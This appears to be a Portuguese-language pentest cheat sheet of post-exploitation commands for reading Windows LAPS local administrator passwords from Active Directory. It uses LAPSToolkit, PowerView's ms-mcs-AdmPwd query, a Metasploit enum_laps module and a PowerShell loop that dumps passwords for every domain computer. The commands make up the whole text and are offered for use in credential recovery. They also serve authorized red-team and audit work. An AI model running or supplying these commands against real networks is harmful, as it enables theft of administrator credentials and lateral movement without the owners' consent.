# LAPS

% laps, password

## obter senhas laps
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER  
```
Get-LAPSPasswords -DomainController <ip_dc> -Credential <domain>\<login> | Format-Table -AutoSize
```

## obter lista de computadores laps
```powershell
Import-Module .\LAPSToolkit.ps1
Get-LAPSComputers
```

## identifica a lista do grupo que pode manipular dados do SAM
```powershell 
Import-Module .\LAPSToolkit.ps1
Find-LAPSDelegatedGroups
```

## obter a senha do laps utilizando powerview
## powerview get laps password
```powershell
Get-DomainObject <computer> -Properties "ms-mcs-AdmPwd",name
```

## obter a senha do laps utilizando metasploit

```
use windows/gather/credentials/enum_laps
```

## obter as senhas de todas as maquias.
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}
```
